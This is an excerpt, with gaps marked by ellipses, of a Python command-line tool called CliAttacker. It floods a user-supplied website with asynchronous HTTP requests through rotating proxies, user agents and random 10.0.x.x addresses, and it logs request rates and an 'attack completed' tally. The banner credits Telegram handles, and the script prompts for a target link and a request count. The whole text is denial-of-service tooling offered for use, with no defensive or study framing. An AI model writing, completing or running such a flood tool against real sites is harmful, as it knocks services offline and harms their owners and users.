...
class CliAttacker:
        ...
        try:
            async with session.get(self.target_url, headers=headers, timeout=3) as response:
                ...
                if self.success_count % 50 == 0:
                    ...
                    self.log(WHITE + f"Requests: {self.success_count} | Rate: {rate:.1f}/s | IP: {ip_address}")
        except:
            self.fail_count += 1
    ...
    async def attack(self):
        ...
        self.log(WHITE + "Fetching proxy list...")
        
        ip_list = await self.get_all_ips()
        if not ip_list:
            ip_list = [f"10.0.{random.randint(0,255)}.{random.randint(0,255)}" for _ in range(2000)]
        self.log(WHITE + f"Loaded {len(user_agents)} User-Agents")
        self.log(WHITE + f"Loaded {len(ip_list)} IPs | Starting attack...")
        ...
        elapsed = time.time() - self.start_time
        self.log(WHITE + f"Attack completed: {self.success_count} success, {self.fail_count} failed in {elapsed:.2f}s")
...
Tg;  bulletarch |||| Refined by; rg6f
"""
    for line in banner.splitlines():
        print(f"{WHITE}{line.center(columns)}{Fore.RESET}")

if __name__ == "__main__":
    print_banner()
    target_url = input(WHITE + "Enter website link: ")
    num_requests = int(input(WHITE + "Enter request amount: "))
